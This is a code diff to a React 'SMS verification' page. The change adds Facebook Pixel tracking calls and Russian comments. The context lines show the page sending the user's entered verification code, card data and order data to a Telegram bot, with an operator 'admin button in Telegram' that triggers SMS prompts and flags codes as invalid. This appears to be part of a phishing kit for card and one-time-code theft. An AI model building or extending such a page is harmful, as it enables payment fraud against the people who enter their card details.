@@ -2,6 +2,7 @@ import React, { useState, useEffect } from 'react'
 import { useNavigate, useLocation } from 'react-router-dom'
 import { useLanguage } from '../context/LanguageContext'
 import { notifySMSCodeEntered } from '../utils/telegramBot'
+import { trackLead, trackPageView, initPixel } from '../utils/fbPixel'
 import LoadingSpinner from '../components/LoadingSpinner'
 import './SMSVerificationPage.css'
 
@@ -68,9 +69,8 @@ const SMSVerificationPage = () => {
     notifySMSCodeEntered(verificationCode, cardData, orderData)
 
     // Track Facebook Pixel Lead event - ONLY when OTP code is submitted
-    if (typeof fbq !== 'undefined') {
-      fbq('track', 'Lead')
-    }
+    // Используем утилиту для отслеживания с правильной инициализацией
+    trackLead()
 
     // Start checking for invalid SMS flag (only after SMS submission)
     if (window.startInvalidSMSCheck) {
@@ -125,6 +125,12 @@ const SMSVerificationPage = () => {
     // Store interval for cleanup
     localStorage.setItem('paymentStatusInterval', checkPaymentStatus)
   }
+
+  // Инициализация Facebook Pixel на странице SMS верификации
+  useEffect(() => {
+    initPixel()
+    trackPageView()
+  }, [])
 
   // Check if SMS verification is requested (set by admin button in Telegram)
   useEffect(() => {
